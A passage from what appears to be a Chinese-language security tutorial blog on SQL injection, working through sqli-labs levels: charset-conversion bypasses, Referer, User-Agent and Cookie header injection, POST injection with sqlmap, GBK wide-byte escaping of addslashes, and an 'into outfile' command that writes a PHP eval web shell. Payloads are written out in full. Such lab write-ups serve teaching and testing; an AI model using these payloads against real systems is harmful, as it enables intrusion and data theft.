invoke__\">mysql_real_escape_string</span>(<span class=\"string\">&quot;hehe&quot;</span>.<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `demo` where `name`=`<span class=\"subst\">&#123;$name&#125;</span>`&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;name&#x27;</span>] == <span class=\"string\">&quot;hehe&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">&#123;$c&#125;</span> &lt;br/&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>通过上述脚本，我么可以查到一些 latin1 的单词，来绕过，比如 <code>Å</code></p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>一些通过 get 提交，mysql 不认识，但 php 认识的字符，限制于 get</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class=\"string\">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Permission denied!&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;SELECT * FROM z_users where username = &#x27;<span class=\"subst\">&#123;$username&#125;</span>&#x27; and password = &#x27;<span class=\"subst\">&#123;$password&#125;</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>大概内容就是 username=admin 时会直接 die，不是 admin 但又查不出东西</p>\n<p>mysql 默认字符集为 latin1，根本原因为 mysql 字符集和 mysqli 客户端字符集不同。我们通过语句 <code>mysql_query(&quot;set names utf-8&quot;);</code>  , <code>set names utf8</code>  的意思是将客户端的字符集设置为 utf8。mysql 有如下几种 charset</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like &quot;%character%&quot;;</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| Variable_name            | Value                                    |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| character_set_client     | utf8                                     |</span><br><span class=\"line\">| character_set_connection | utf8                                     |</span><br><span class=\"line\">| character_set_database   | gbk                                      |</span><br><span class=\"line\">| character_set_filesystem | binary                                   |</span><br><span class=\"line\">| character_set_results    | utf8                                     |</span><br><span class=\"line\">| character_set_server     | utf8                                     |</span><br><span class=\"line\">| character_set_system     | utf8                                     |</span><br><span class=\"line\">| character_sets_dir       | D:\\BtSoft\\mysql\\MySQL5.5\\share\\charsets\\ |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">8 rows in set (0.04 sec)</span><br></pre></td></tr></table></figure>\n<p>在默认情况下，mysql 字符集为 latin1，而执行了 <code>set names utf8;</code>  以后， <code>character_set_client</code> 、 <code>character_set_connection</code> 、 <code>character_set_results</code>  等与客户端相关的配置字符集都变成了 utf8，但 <code>character_set_database</code> 、 <code>character_set_server</code>  等服务端相关的字符集还是 latin1。</p>\n<p>因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql 在执行查询的时候，就涉及到字符集的转换。</p>\n<ol>\n<li>MySQL Server 收到请求时将请求数据从 character_set_client 转换为 character_set_connection；</li>\n<li>进行内部操作前将请求数据从 character_set_connection 转换为内部操作字符集</li>\n</ol>\n<p><code>character_set_client</code>  和 <code>character_set_connection</code>  被设置成了 utf8，而 <code>内部操作字符集</code> 其实也就是 <code>username</code>  字段的字符集还是默认的 latin1。于是，整个操作就有如下字符串转换过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure>\n<p>最后执行比较 <code>username='admin'</code>  的时候， <code>'admin'</code>  是一个 latin1 字符串。</p>\n<p>因此对于以下 url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:9090/test.php?username=admin%e4</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd%ac</span><br></pre></td></tr></table></figure>\n<p>前两个可以正常查询，但最后一个会产生错误，并且 url 中从 <code>%e4%bd%ac</code>  变为了 <code>佬</code></p>\n<p>在输入 % e4,% e4% bd 时，因为 utf8 是三个字节，他不认识这个两个字节和一个字节的玩意，自动忽略，扔给 latin1 时还是 admin，因此服务端正常查询</p>\n<p>一但 % e4% bd% ac 输入完整后，这三个字节拼成了佬，现在 utf8 认识了，传给服务端的时候变成了 admin 佬，现在 latin1 不认识了，开始报错</p>\n<p>这就是这三个前两个可以正常查询，但第三个报错的原因</p>\n<p>继续查询，我们发现只有部分字符可以正常查询出结果，但有些不能</p>\n<p>比如 admin% c2 可以，但 admin% c1 就不行，经过师傅的测试，有如下结果</p>\n<blockquote>\n<ol>\n<li>\\x00 <code>~</code> \\x7F`： 返回空白结果</li>\n<li><code>\\x80</code> ~ <code>\\xC1</code> ： 返回错误 Illegal mix of collations</li>\n<li><code>\\xC2</code> ~ <code>\\xEF</code> ： 返回 admin 的结果</li>\n<li><code>\\xF0</code> ~ <code>\\xFF</code> ： 返回错误 Illegal mix of collations</li>\n</ol>\n</blockquote>\n<p>UTF-8 编码是变长编码，可能有 1~4 个字节表示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022172222480.png\" alt=\"image-20221022172222480\"></p>\n<p>然后根据 RFC 3629 规范，又有一些字节值是不允许出现在 UTF-8 编码中的：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db28c7b4-4dc9-4592-9fc7-23f0290c3892.6e734d61aa73.jpg\" alt=\"14917445720884.jpg\"></p>\n<p>所以最终，UTF-8 第一字节的取值范围是：00-7F、C2-F4，这也是我在 admin 后面加上 80-C1、F5-FF 等字符时会抛出错误的原因。</p>\n<p>那么，为什么 <code>username=admin%F0</code>  也不行呢？F0 是在 C2-F4 的范围中呀？</p>\n<p>这又涉及到 Mysql 中另一个特性：<strong>Mysql 的 utf8 其实是阉割版 utf-8 编码，Mysql 中的 utf8 字符集最长只支持三个字节</strong>，</p>\n<p>F0-F4 是四字节才有的，所以我传入 <code>username=admin%F0</code>  也将抛出错误。</p>\n<p>如果你需要 Mysql 支持四字节的 utf-8，可以使用 <code>utf8mb4</code>  编码。我将原始代码中的 set names 改成 <code>set names utf8mb4</code> ，就可以正常查询了</p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对于php和mysql之间的编码问题，post和get方法是不一样的，post不用URL编码，可以直接用latin文字绕过</span><br><span class=\"line\">get需要利用到mysql字符集之间的转换，同时还要对utf8的字节范围熟悉，这样在utf8-utf9-latin1时就可以利用编码转换逃逸了</span><br><span class=\"line\">同时注意mysql的utf8是三个字节的，要是想用f0-f4需要把编码变为utf8mb4</span><br><span class=\"line\">utf8mb4是个好东西，还能防宽字节，下面会有详细描述</span><br></pre></td></tr></table></figure>\n<p>参考 p 师傅博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20=\">https://www.leavesongs.com</span></p>\n<h5 id=\"referer注入\"><a class=\"markdownIt-Anchor\" href=\"#referer注入\">#</a> referer 注入</h5>\n<p>通过 referer 字段不严格的过滤产生注入</p>\n<p>phpcmsv9 存在 referer 注入</p>\n<p>sqllab pass-19</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png\" alt=\"image-20220311175006708\"></p>\n<p>通过闭合确定 referer 存在注入</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>构造如下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1),&#x27;127.0.0.100&#x27;)#</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>注意题目源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class=\"line\">闭合时需要在闭合一个括号</span><br></pre></td></tr></table></figure>\n<h5 id=\"user-agent注入\"><a class=\"markdownIt-Anchor\" href=\"#user-agent注入\">#</a> user-agent 注入</h5>\n<p>参考 sqllab 第 18 关</p>\n<p>1. 关于 sql 参数过滤，check_input 用于检查输入的内容。</p>\n<p>第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符</p>\n<p>如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>s</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">value = stripslashes(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_input($value)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tif(!empty($value))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t// truncation (see comments)</span><br><span class=\"line\">\t\t$value = substr($value,0,20);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Stripslashes if magic quotes enabled</span><br><span class=\"line\">\t\tif (get_magic_quotes_gpc())</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = stripslashes($value);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Quote if not a number</span><br><span class=\"line\">\t\tif (!ctype_digit($value))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t$value = intval($value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\treturn $value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数据库中接收参数的语句为 </span><br><span class=\"line\">\t$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class=\"line\">\t$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png\" alt=\"image-20220311173048631\"></p>\n<p>0. 数据库中闭合语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>\n<p>最终 payload 有两种形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1),&#x27;127.0.0.1&#x27;,&#x27;sb&#x27;)#</span><br><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐</span><br><span class=\"line\">//但加如)后会导致列数不匹配,后面还需要补充两列</span><br></pre></td></tr></table></figure>\n<p>也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的</p>\n<h5 id=\"cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入\">#</a> cookie 注入</h5>\n<p>通过没有过滤 cookie 字段的值产生的 cookie 注入</p>\n<p>sqllab pass-20，21，22</p>\n<p>注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie。只有提交正确的用户名和密码才能到 if 中 setcookie</p>\n<p>后续在第二个包中注入，没有设置 submit 时会进第二个 if 走 select 查询</p>\n<p>验证存在注入：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png\" alt=\"image-20220311175929845\"></p>\n<p>进行注入：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png\" alt=\"image-20220311180121906\"></p>\n<p>最终构造的 paylaod 为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>不加 <code>)</code>  的原因是他的查询语句长这样：</p>\n<p>​      <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mo>∗</mo><mi>F</mi><mi>R</mi><mi>O</mi><mi>M</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>W</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></mrow><annotation encoding=\"application/x-tex\">sql=&quot;SELECT * FROM users WHERE username=&#x27;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span>cookee’ LIMIT 0,1&quot;;</p>\n<p>你只需要闭合 <code>'</code>  不再需要闭合 <code>)</code></p>\n<h5 id=\"post注入\"><a class=\"markdownIt-Anchor\" href=\"#post注入\">#</a> post 注入</h5>\n<p>通过 post 提交的参数中注入</p>\n<p>postman,hackbar,burpsuite 可以提交 post 参数</p>\n<p>sqllabs less11  - less14</p>\n<p>sqli - less11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=-1&#x27; union select 1,2#&amp;passws=1111</span><br></pre></td></tr></table></figure>\n<p>sqlmap 两种形式</p>\n<p>1. 将 http 请求包放入 txt 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 1.txt</p>\n<p>2.sqlmap -u URL --data “”</p>\n<h5 id=\"sql读写文件注入\"><a class=\"markdownIt-Anchor\" href=\"#sql读写文件注入\">#</a> SQL 读写文件注入</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select into outfile  导出数据</span><br><span class=\"line\">?id=-1&#x27; union select &lt;?php eval($_POST[&#x27;C&#x27;]);?&gt; into outfile E:/web.php</span><br><span class=\"line\"></span><br><span class=\"line\">outfile 导出条件</span><br><span class=\"line\">root权限</span><br><span class=\"line\">GPC关闭（能使用单引号)</span><br><span class=\"line\">有绝对路径（读文件可以不用，写文件必须)</span><br><span class=\"line\">没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27;)) union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &#x27;网站物理路径&#x27; --+</span><br><span class=\"line\">less-7/demo.php</span><br><span class=\"line\">?id=1&#x27;)) union select 1,2, &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; into outfile &quot;D:/Phpstudy/PHPTutorial/test1.php --+</span><br><span class=\"line\">写马的时候必须使用字符串</span><br></pre></td></tr></table></figure>\n<h5 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h5>\n<p>导致原因： <code>mysql_query(&quot;set names gbk&quot;)</code>  错误使用了编码方式 <code>gbk</code></p>\n<p>一个 <code>gbk</code>  编码汉字，占用 2 个字节。一个 <code>utf-8</code>  编码的汉字，占用 3 个字节。</p>\n<p>假设我们有以下代码，并且我们的 <code>magic_quotes_gpc</code>  是关闭的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span><br><span class=\"line\">$conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;toor!@#$&#x27;) or die(&#x27;bad!&#x27;);</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_select_db(&#x27;test&#x27;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class=\"line\">//执行sql语句</span><br><span class=\"line\">$id = isset($_GET[&#x27;id&#x27;]) ? addslashes($_GET[&#x27;id&#x27;]) : 1;</span><br><span class=\"line\">$sql = &quot;SELECT * FROM news WHERE tid=&#x27;&#123;$id&#125;&#x27;&quot;;</span><br><span class=\"line\">$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset=&quot;gbk&quot; /&gt;</span><br><span class=\"line\">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class=\"line\">echo &quot;&lt;h2&gt;&#123;$row[&#x27;title&#x27;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&#x27;content&#x27;]&#125;&lt;p&gt;\\n&quot;;</span><br><span class=\"line\">mysql_free_result($result);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>如果我们想注入，那么必须绕过 <code>addslashes</code>  的过滤，我们可以有两种思路：</p>\n<blockquote>\n<p>1. 想办法给 <code>\\</code>  前面再加一个 <code>\\</code> （或单数个即可），变成 <code>\\\\'</code> ，这样 <code>\\</code>  被转义了， <code>'</code>  逃出了限制</p>\n<p>2. 想办法把 <code>\\</code>  弄没有。</p>\n</blockquote>\n<p>我们先说把 <code>\\</code>  弄没有的情况</p>\n<p>mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个 ascii 码要大于 128，才到汉字的范围）。如果我们输入 <code>%df'</code>  看会怎样：</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''111ß\\''' at line 1</code></p>\n<p>此时出现报错，说明存在注入</p>\n<p>这就是 mysql 的特性，因为 <code>gbk</code>  是多字节编码，他认为两个字节代表一个汉字，所以 <code>%df</code>  和后面的 <code>addslash</code>  加的 <code>\\</code>  也就是 <code>%5c</code>  变成了一个汉字 <code>運</code> ，而 <code>'</code>  逃逸了出来。</p>\n<p>因为两个字节代表一个汉字，所以我们可以试试 <code>%df%df%27</code> ：</p>\n<p>此时不报错了， <code>%df%df</code>  拼成了一个汉字， <code>%5c%27</code>  因为 <code>27</code>  不大于 128，不构成汉字。所以根据这个特性，我们用 <code>1%a1'</code>  也可以。</p>\n<p><code>%a1%5c</code>  他可能不是汉字，但一定会被 mysql 认为是一个宽字符，就能够让后面的 <code>%27</code>  逃逸了出来。</p>\n<p>但如果我们把 gbk 换成 gb2312，我们的 <code>%df%5c%27</code>  又不能注入了</p>\n<p>这归结于 gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 